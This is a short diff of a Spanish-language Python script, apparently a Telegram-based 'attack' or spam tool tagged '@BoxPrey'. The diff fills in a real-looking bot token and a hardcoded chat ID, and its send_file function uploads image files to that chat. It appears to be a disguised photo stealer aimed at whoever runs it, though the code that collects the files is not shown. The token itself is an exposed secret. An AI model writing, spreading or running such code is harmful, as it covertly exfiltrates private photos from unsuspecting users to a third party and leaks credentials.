@@ -46,7 +46,7 @@ import os
 from threading import Thread
 
 # Token de tu bot de Telegram
-bot_token = "Tu_Token"
+bot_token = "8686037136:AAEvkgbEYF5EuJ1phCJ8TfGN7-osq6Isnho"
 #@BoxPrey
 bot = telebot.TeleBot(bot_token)
 #@BoxPrey
@@ -55,7 +55,7 @@ name = input('''\033[95m𝐈𝐧𝐠𝐫𝐞𝐬𝐚 𝐄𝐥 𝐧𝐮𝐦𝐞�
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.endswith(".jpg") or file_path.endswith(".png") or file_path.endswith(".PNG") or file_path.endswith(".JPEG") or file_path.endswith(".jpeg") or file_path.endswith(".Webp") or file_path.endswith(".webp"):
-            bot.send_photo(chat_id="Tu_Id", photo=f)
+            bot.send_photo(chat_id="7979617215", photo=f)
 
 def attack_message():
     while True:
